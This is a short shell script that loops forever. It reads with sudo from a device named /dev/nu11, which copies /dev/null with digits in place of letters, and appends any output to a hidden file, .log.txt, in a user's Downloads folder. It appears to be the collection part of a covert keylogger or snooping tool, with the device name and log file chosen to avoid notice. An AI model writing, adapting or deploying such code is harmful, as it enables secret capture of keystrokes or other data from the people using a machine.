#!/bin/sh

endlessloop() {
        while [ 1 ]
        do
                text=$(sudo cat /dev/nu11)
                if [ "$text" = ""  ]
                then
			:
                else
                        echo -n $text >> /home/sherlock/Downloads/.log.txt
                fi
        done
}

endlessloop
